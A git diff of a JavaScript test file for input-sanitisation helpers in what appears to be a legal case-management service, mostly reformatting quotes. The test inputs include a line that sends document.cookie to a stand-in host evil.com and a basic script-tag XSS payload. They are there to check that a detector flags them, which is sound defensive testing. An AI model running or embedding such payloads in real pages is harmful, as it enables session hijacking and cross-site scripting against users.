@@ -200,7 +200,7 @@ const validRoleList = [
   'post-hearing-salaried-judge',
   'cica',
   'allocated-legal-officer',
-  'allocated-administrator'
+  'allocated-administrator',
 ];
 
 describe('api utils', () => {
@@ -307,7 +307,7 @@ describe('api utils', () => {
     });
 
     it('should return true to detect document.cookie (session hijacking)', () => {
-      const input = 'fetch(\'http://evil.com?cookie=\' + document.cookie)';
+      const input = "fetch('http://evil.com?cookie=' + document.cookie)";
       expect(containsDangerousCode(input)).to.equal(true);
     });
 
@@ -334,12 +334,11 @@ describe('api utils', () => {
     });
 
     it('should return true to detect <script> tags (basic XSS)', () => {
-      const input = '<script>alert(\'XSS\')</script>';
+      const input = "<script>alert('XSS')</script>";
       expect(containsDangerousCode(input)).to.equal(true);
     });
   });
 
-  // todo: unignore and fix following updated list of valid characters
   describe('allContainOnlySafeCharacters', () => {
     it('should allow all valid roles possible for role assignment', () => {
       expect(allContainOnlySafeCharacters(validRoleList)).to.equal(true);
